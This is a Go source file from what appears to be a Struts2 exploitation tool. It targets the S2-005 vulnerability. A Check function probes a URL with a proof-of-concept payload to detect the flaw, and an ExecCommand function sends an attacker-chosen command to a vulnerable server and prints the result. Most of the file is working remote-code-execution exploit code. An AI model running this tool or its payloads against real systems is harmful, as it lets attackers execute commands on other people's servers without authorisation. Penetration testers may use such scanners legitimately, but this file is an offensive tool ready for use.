package s005

import (
	"ST2G/cvemod/x51utils"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func Check(url string){
	var  buffer []byte
	buffer = make([]byte, 512)
	url+=x51utils.POC_s005_check
	req, err := http.NewRequest("GET", url, nil)
	req.Header.Add("Accept-Encoding", "gzip")
	if err != nil {
		log.Fatal("Error reading request. ")
	}
	client := &http.Client{Timeout: time.Second * 10}

	resp, err := client.Do(req)
	if err != nil {
		log.Fatal("Error reading response. ")
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		response,_:= client.Do(req)
		response.Body.Read(buffer)
		body = buffer
	}
	respBody := string(body)
	isVulnable := strings.Contains(respBody, x51utils.Checkflag)
	if isVulnable {
		x51utils.Colorlog("Found Struts2-005!")

	} else {
		fmt.Println("Struts2-005 Not Vulnerable.")
	}
}

func ExecCommand(url string,command string){
	var  buffer []byte
	buffer = make([]byte, 512)
	url+=x51utils.POC_s005_exec(command)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		log.Fatal("Error reading request. ")
	}
	client := &http.Client{Timeout: time.Second * 10}

	resp, err := client.Do(req)
	if err != nil {
		log.Fatal("Error reading response. ")
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		response,_:= client.Do(req)
		response.Body.Read(buffer)
		body = buffer
	}
	respBody := string(body)
	fmt.Println(respBody)
}